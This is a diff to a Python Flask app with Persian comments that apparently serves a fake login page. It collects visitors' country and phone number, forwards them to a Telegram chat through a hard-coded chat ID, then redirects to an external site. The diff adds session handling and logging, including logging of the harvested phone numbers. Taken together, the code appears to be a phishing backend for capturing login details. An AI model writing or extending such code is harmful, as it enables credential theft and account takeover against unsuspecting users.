@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, session
 import requests
 import logging
 
@@ -16,26 +16,32 @@ CHAT_ID = "5088806230"
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if "attempts" not in session:
-        session["attempts"] = 0  # مقداردهی اولیه به تعداد تلاش‌ها (اختیاری، اگه نیاز داری)
+        session["attempts"] = 0  # مقداردهی اولیه به تعداد تلاش‌ها
+        logger.info("Initialized session attempts to 0")
 
     if request.method == 'POST':
         try:
+            logger.info("Received POST request")
             # دریافت اطلاعات فرم
-            country = request.form.get('country')
-            phone = request.form.get('phone')
+            country = request.form.get('country', '')
+            phone = request.form.get('phone', '')
+            logger.info(f"Form data - Country: {country}, Phone: {phone}")
             
             if not country or not phone:
+                logger.warning("Missing country or phone in form data")
                 return jsonify({"status": "error", "message": "Country and phone are required"}), 400
 
             # ارسال اطلاعات به تلگرام
             send_to_telegram(country, phone)
             
             # ریدایرکت به URL پس از ارسال اطلاعات
+            logger.info("Login successful, redirecting to URL")
             return jsonify({"status": "success", "redirect_url": "https://codever-production.up.railway.app/"})
         except Exception as e:
             logger.error(f"Server error in POST request: {str(e)}")
             return jsonify({"status": "error", "message": f"Server error: {str(e)}"}), 500
 
+    logger.info("Rendering login.html")
     return render_template('login.html')
 
 def send_to_telegram(country, phone):
